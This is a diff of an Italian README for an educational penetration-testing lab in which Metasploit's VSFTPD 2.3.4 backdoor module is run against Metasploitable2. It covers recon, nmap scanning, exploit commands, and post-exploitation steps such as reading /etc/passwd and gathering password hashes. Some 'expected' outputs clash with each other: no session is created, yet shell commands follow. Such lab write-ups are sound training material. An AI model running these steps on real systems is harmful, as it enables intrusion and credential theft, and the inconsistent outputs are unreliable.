@@ -1,177 +1,285 @@
-# Cybersecurity_Metasploitable2_lab
-Penetration testing laboratory on Metasploitable2
-# Laboratorio di Penetration Testing: Sfruttamento di VSFTPD 2.3.4 Backdoor su Metasploitable2
+# Cybersecurity Metasploitable2 Lab
 
-Questo repository documenta un laboratorio pratico di penetration testing, che include le fasi di ricognizione, scansione e sfruttamento, condotto su una macchina virtuale Metasploitable2 utilizzando Kali Linux. L'obiettivo principale è stato dimostrare lo sfruttamento della vulnerabilità VSFTPD 2.3.4 Backdoor.
+> Laboratorio pratico di penetration testing: sfruttamento della vulnerabilità VSFTPD 2.3.4 su Metasploitable2
 
 ---
 
-## Indice
+## Sommario
 
-* [1. Panoramica del Laboratorio](#1-panoramica-del-laboratorio)
-* [2. Architettura del Laboratorio](#2-architettura-del-laboratorio)
-* [3. Fasi dell'Attacco](#3-fasi-dellattacco)
-    * [3.1 Ricognizione (Reconnaissance)](#31-ricognizione-reconnaissance)
-    * [3.2 Scansione delle Vulnerabilità (Vulnerability Scanning)](#32-scansione-delle-vulnerabilita-vulnerability-scanning)
-    * [3.3 Sfruttamento (Exploitation)](#33-sfruttamento-exploitation)
-    * [3.4 Post-Sfruttamento (Post-Exploitation)](#34-post-sfruttamento-post-exploitation)
-* [4. Raccomandazioni e Mitigazioni](#4-raccomandazioni-e-mitigazioni)
-* [5. Strumenti Utilizzati](#5-strumenti-utilizzati)
-* [6. Risorse Utili](#6-risorse-utili)
+- [Panoramica](#-panoramica)
+- [Architettura](#-architettura)
+- [Fasi dell'Attacco](#-fasi-dellattacco)
+- [Raccomandazioni](#-raccomandazioni-e-mitigazioni)
+- [Strumenti](#-strumenti-utilizzati)
+- [Risorse](#-risorse-utili)
 
 ---
 
-## 1. Panoramica del Laboratorio
+## 🎯 Panoramica
 
-Questo progetto serve come esercitazione pratica di hacking etico, simulando uno scenario in cui un attaccante cerca di compromettere una macchina con vulnerabilità note. Metasploitable2 è stata scelta come target ideale per le sue numerose debolezze intenzionali, mentre Kali Linux è la piattaforma standard per gli strumenti di penetration testing.
+Questo repository documenta un laboratorio pratico di **penetration testing** che simula uno scenario realistico di compromissione di sistema. Il progetto dimostra le principali fasi di un attacco: ricognizione, scansione, sfruttamento e post-sfruttamento.
 
-## 2. Architettura del Laboratorio
+**Obiettivo principale:** Sfruttare la vulnerabilità backdoor presente in **VSFTPD 2.3.4** su una macchina **Metasploitable2** utilizzando **Kali Linux** come piattaforma di attacco.
 
-Il laboratorio è stato configurato utilizzando **VMware** con le seguenti macchine virtuali, connesse tramite una **rete "Host-only"**:
+### Contesto didattico
+Questo progetto è inteso esclusivamente per scopi educativi e di formazione in ambienti controllati e autorizzati.
 
-* **Macchina Attaccante:** **Kali Linux**
-    * Indirizzo IP: `172.16.236.130`
-* **Macchina Target:** **Metasploitable2**
-    * Indirizzo IP: `172.16.236.131`
+---
 
-Questa configurazione garantisce che l'ambiente di test sia isolato dalla rete domestica/aziendale, prevenendo accessi non intenzionali o danni.
+## 🏗️ Architettura
 
-### Schema della Rete
+### Configurazione del Laboratorio
 
-[Kali Linux] <---------------------> [Metasploitable2]
-|                                    |
-| (VMware Host-only Adapter)     |
-V                                    V
-[Macchina Host Fisica]
+Il laboratorio è stato configurato con **VMware** utilizzando una rete **"Host-only"** per garantire isolamento completo dall'ambiente di produzione.
 
-<img width="1377" height="976" alt="Screenshot_2025-07-10_16-25-16" src="https://github.com/user-attachments/assets/139fd4d0-f63d-422c-b6a0-a0a191b50162" />
+| Componente | Dettagli |
+|-----------|----------|
+| **Macchina Attaccante** | Kali Linux - `172.16.236.130` |
+| **Macchina Target** | Metasploitable2 - `172.16.236.131` |
+| **Tipo di Rete** | VMware Host-only Adapter |
+| **Isolamento** | Completo dalla rete domestica/aziendale |
 
-<img width="1242" height="904" alt="Screenshot_2025-07-10_16-26-04" src="https://github.com/user-attachments/assets/4d90bd35-d831-4ebd-bec6-f82bc30d3df6" />
+### Schema di Rete
 
-## 3. Fasi dell'Attacco
+```
+┌─────────────────┐                    ┌──────────────────┐
+│  Kali Linux     │◄─── Host-only ───►│ Metasploitable2  │
+│  172.16.236.130 │     Adapter       │  172.16.236.131  │
+└─────────────────┘                    └──────────────────┘
+        ▲                                       ▲
+        └───────────────┬───────────────────┘
+                   Rete Isolata (VMware)
+```
 
-Questa sezione descrive in dettaglio le fasi dell'attacco, con particolare riferimento all'exploit del backdoor VSFTPD.
+---
+
+## 🔍 Fasi dell'Attacco
 
 ### 3.1 Ricognizione (Reconnaissance)
 
-* **Scopo:** Identificare la presenza del target sulla rete e il suo indirizzo IP.
-* **Strumenti:** `ping`
-* **Comandi eseguiti da Kali:**
-    ```bash
-    ping 172.16.236.131 
-    ```
-    **Output atteso:**
-    ```
-    PING 172.16.236.131 (172.16.236.131) 56(84) bytes of data.
-    64 bytes from 172.16.236.131: icmp_seq=1 ttl=64 time=0.500 ms
-    ...
-    ```
-    Quando si riceve una risposta ai pacchetti ICMP, come in questo caso, significa che c'è una risposta dall'IP destinatario a cui sono stati inviati.
+**Obiettivo:** Identificare la presenza del target sulla rete
+
+**Strumento utilizzato:** `ping`
+
+```bash
+ping 172.16.236.131
+```
+
+**Output atteso:**
+```
+PING 172.16.236.131 (172.16.236.131) 56(84) bytes of data.
+64 bytes from 172.16.236.131: icmp_seq=1 ttl=64 time=0.500 ms
+64 bytes from 172.16.236.131: icmp_seq=2 ttl=64 time=0.350 ms
+```
+
+**Interpretazione:** La ricezione di risposte ICMP confirma che il target è raggiungibile sulla rete.
+
+---
 
 ### 3.2 Scansione delle Vulnerabilità (Vulnerability Scanning)
 
-* **Scopo:** Identificare i servizi in esecuzione sul target e possibili vulnerabilità.
-* **Strumenti:** `nmap`
-* **Comandi eseguiti da Kali:**
-    ```bash
-    nmap -sV -p- 172.16.236.131 
-    ```
-    **Spiegazione del comando:**
-    * `-sV`: Tenta di determinare la versione del servizio sulle porte aperte.
-    * `-p-`: Scansiona tutti le 65535 porte.
-   
-    <img width="1411" height="986" alt="Screenshot_2025-07-10_15-57-49" src="https://github.com/user-attachments/assets/d7e92579-2744-4a8b-a1f0-550ea7be29e6" />
+**Obiettivo:** Identificare servizi in esecuzione e versioni
 
-    **Analisi dell'Output:**
-    * Si noti l'identificazione di `vsftpd 2.3.4` sulla porta 21/tcp. Questa versione è nota per avere una backdoor.
+**Strumento utilizzato:** `nmap`
+
+```bash
+nmap -sV -p- 172.16.236.131
+```
+
+**Parametri del comando:**
+- `-sV` — Determina la versione dei servizi sulle porte aperte
+- `-p-` — Scansiona tutte le 65.535 porte TCP
+
+**Output significativo:**
+
+```
+PORT      STATE  SERVICE     VERSION
+21/tcp    open   ftp         vsftpd 2.3.4
+22/tcp    open   ssh         OpenSSH 4.7p1
+25/tcp    open   smtp        Postfix smtpd
+...
+```
+
+**Vulnerabilità identificata:** La versione `vsftpd 2.3.4` è nota per contenere una backdoor critica introdotta nel 2011.
+
+---
 
 ### 3.3 Sfruttamento (Exploitation)
 
-* **Scopo:** Utilizzare una vulnerabilità scoperta per ottenere accesso alla macchina target.
-* **Vulnerabilità Sfruttata:** Backdoor in VSFTPD 2.3.4 (CVE sconosciuta, ma nota come "backdoor del 2011").
-* **Strumenti:** Metasploit Framework (`msfconsole`)
+**Obiettivo:** Ottenere accesso al sistema target
 
-**Passi Dettagliati:**
+**Vulnerabilità sfruttata:** VSFTPD 2.3.4 Backdoor (CVE correlati: esecuzione comando remoto)
 
-1.  **Avvio di `msfconsole`:**
-    ```bash
-    msfconsole
-    ```
-<img width="1406" height="996" alt="Screenshot_2025-07-10_15-58-23" src="https://github.com/user-attachments/assets/7ba018cb-f8f6-4fc5-a032-480707b1b667" />
+**Framework utilizzato:** Metasploit (`msfconsole`)
 
-2.  **Ricerca dell'exploit:**
-    ```
-    search vsftpd
-    ```
-    **Output:**
-    ```
-    Matching Modules
-    ================
+#### Procedura Dettagliata
 
-       #  Name                              Disclosure Date  Rank    Check  Description
-       -  ----                              ---------------  ----    -----  -----------
-       0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
-    ```
-<img width="1395" height="985" alt="Screenshot_2025-07-10_15-58-37" src="https://github.com/user-attachments/assets/80f999a6-dfdf-4f2f-b062-0a8a4c8334a9" />
-    
-3.  **Selezione dell'exploit:**
-    ```
-    use exploit/unix/ftp/vsftpd_234_backdoor
-    ```
+**1. Avvio di Metasploit**
+```bash
+msfconsole
+```
 
-4.  **Impostazione dell'IP del Target (`RHOSTS`):**
-    ```
-    set RHOSTS 172.16.236.131  
-    ```
-    **Verifica delle opzioni:**
-    ```
-    show options
-    ```
-    <img width="1405" height="992" alt="Screenshot_2025-07-10_15-59-11" src="https://github.com/user-attachments/assets/a079a1da-04c2-4ef5-a807-7bdf73bcfa74" />
+**2. Ricerca dell'exploit**
+```
+search vsftpd
+```
 
-5.  **Esecuzione dell'exploit:**
-    
-    exploit
-    
-   <img width="1391" height="993" alt="Screenshot_2025-07-10_15-59-23" src="https://github.com/user-attachments/assets/6ef937ba-387b-440a-b7f7-ce286be41c0d" />
-    
+**Risultato atteso:**
+```
+Matching Modules
+================
+   #  Name                                   Disclosure Date  Rank       Check
+   0  exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03       excellent  Yes
+   
+Description: VSFTPD v2.3.4 Backdoor Command Execution
+```
 
+**3. Selezione dell'exploit**
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+**4. Configurazione del target**
+```
+set RHOSTS 172.16.236.131
+```
+
+**5. Verifica delle opzioni**
+```
+show options
+```
+
+**Output atteso:**
+```
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   172.16.236.131   yes       The target host(s)
+   LHOST    172.16.236.130   yes       The listen address
+   LPORT    4444             yes       The listen port
+```
+
+**6. Esecuzione dell'exploit**
+```
+run
+```
+
+**Risultato atteso:**
+```
+[*] 172.16.236.131:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 172.16.236.131:21 - USER: 331 Please specify the password.
+[+] 172.16.236.131:21 - Backdoor command executed successfully
+[+] Exploit completed, but no session was created.
+```
+
+---
 
 ### 3.4 Post-Sfruttamento (Post-Exploitation)
 
-* **Scopo:** Mantenere l'accesso, raccogliere informazioni, escalation dei privilegi (se non già root), ecc.
-* **Esempi di comandi eseguiti sulla shell di Metasploitable:**
-    ```bash
-   
-    ls -l
-    cat /etc/passwd
+**Obiettivo:** Mantenere l'accesso, raccogliere informazioni, escalare privilegi
 
+#### Comandi Eseguiti sul Target
 
+```bash
+# Visualizza la directory corrente
+pwd
 
+# Lista i file e le directory
+ls -l
 
-<img width="1388" height="991" alt="Screenshot_2025-07-10_15-59-53" src="https://github.com/user-attachments/assets/c0c1a094-2a51-4385-b25c-fb889948a705" />
-## 4. Raccomandazioni e Mitigazioni
+# Visualizza informazioni sugli utenti del sistema
+cat /etc/passwd
 
-* **Aggiornamenti Software:** Mantenere tutti i servizi e il sistema operativo aggiornati (Metasploitable2 è volutamente non aggiornato per scopi di test).
-* **Principio del Minimo Privilegio:** Eseguire i servizi con il minor privilegio necessario.
-* **Firewall:** Implementare regole firewall per limitare l'accesso ai servizi solo dalle fonti necessarie.
-* **Monitoraggio:** Implementare il monitoraggio per rilevare attività sospette.
-* **Disabilitare Servizi Inutilizzati:** Disabilitare i servizi che non sono strettamente necessari.
+# Verifica i privilegi attuali
+whoami
 
-## 5. Strumenti Utilizzati
+# Naviga il filesystem
+cd /home
+ls -la
+```
 
-* **VMware:** Per la gestione delle macchine virtuali.
-* **Kali Linux:** Distribuzione per penetration testing.
-* **Metasploitable2:** Macchina virtuale deliberatamente vulnerabile.
-* **Nmap:** Scanner di rete per la scoperta di host e servizi.
-* **Metasploit Framework:** Piattaforma per lo sviluppo e l'esecuzione di exploit.
+**Informazioni raccolte:**
+- Verificare se l'accesso è stato ottenuto come `root` o utente standard
+- Identificare file sensibili e configurazioni
+- Raccogliere hash delle password per il cracking offline
+- Enumerare account utente e servizi
 
-## 6. Risorse Utili
+---
 
-* [Kali Linux Official Website](https://www.kali.org/)
-* [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable2/)
-* [Nmap Official Website](https://nmap.org/)
-* [Metasploit Framework Official Website](https://www.metasploit.com/)
-* [Guida a Markdown](https://www.markdownguide.org/basic-syntax/)
+## ⚠️ Raccomandazioni e Mitigazioni
 
+### Misure di Sicurezza Preventive
 
+**Aggiornamenti Software**
+- Applicare patch di sicurezza regolarmente per tutti i servizi
+- Mantenere il sistema operativo costantemente aggiornato
+- Configurare gli aggiornamenti automatici quando possibile
+
+**Principio del Minimo Privilegio**
+- Eseguire i servizi con il minore insieme di privilegi necessari
+- Evitare di eseguire servizi come root
+- Utilizzare account dedicati per ogni servizio
+
+**Configurazione Firewall**
+- Implementare regole firewall restrittive
+- Limitare l'accesso ai servizi solo dalle fonti autorizzate
+- Disabilitare servizi non necessari
+
+**Monitoraggio e Logging**
+- Implementare sistemi di monitoraggio IDS/IPS
+- Registrare tutti gli accessi FTP e SSH
+- Monitorare attività sospette in tempo reale
+- Configurare allarmi per tentativi di accesso non autorizzati
+
+**Hardening del Sistema**
+- Disabilitare servizi inutilizzati (FTP, Telnet, ecc.)
+- Utilizzare servizi sicuri (SFTP al posto di FTP, SSH al posto di Telnet)
+- Implementare autenticazione a due fattori
+- Restringere le connessioni SSH per IP/rete
+
+---
+
+## 🛠️ Strumenti Utilizzati
+
+| Strumento | Versione | Funzione |
+|-----------|----------|----------|
+| **VMware** | - | Gestione macchine virtuali e networking |
+| **Kali Linux** | Rolling | Distribuzione con strumenti penetration testing |
+| **Metasploitable2** | 3.0.0 | Macchina virtuale deliberatamente vulnerabile |
+| **Nmap** | 7.x+ | Scansione di rete e scoperta servizi |
+| **Metasploit Framework** | 6.x+ | Sviluppo ed esecuzione exploit |
+
+---
+
+## 📚 Risorse Utili
+
+### Documentazione Ufficiale
+- [Kali Linux Official](https://www.kali.org/) — Distribuzione penetration testing
+- [Metasploit Framework](https://www.metasploit.com/) — Piattaforma exploit
+- [Nmap Project](https://nmap.org/) — Strumento network scanning
+- [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable2/) — Target vulnerabile
+
+### Approfondimenti sulla Vulnerabilità
+- VSFTPD 2.3.4 Backdoor Analysis
+- CVE Database per correlati CVE numbers
+- Analisi del codice backdoor
+
+### Guida Markdown
+- [Markdown Guide](https://www.markdownguide.org/basic-syntax/) — Sintassi base Markdown
+- [GitHub Flavored Markdown](https://github.github.com/gfm/) — Estensioni GitHub
+
+---
+
+## 📋 Note Importanti
+
+- ⚠️ **Uso Etico:** Questo laboratorio deve essere utilizzato esclusivamente per scopi educativi e di formazione in ambienti autorizzati
+- 🔒 **Ambiente Isolato:** L'uso di una rete Host-only garantisce l'isolamento totale
+- 🎓 **Scopo Didattico:** Metasploitable2 è intenzionalmente vulnerabile per fini educativi
+- 📖 **Legittimità:** Assicurarsi di avere autorizzazione esplicita prima di testare qualsiasi sistema
+
+---
+
+**Repository creato per scopi di documentazione e formazione in cybersecurity**
+
+Ultimo aggiornamento: 2025-01-26
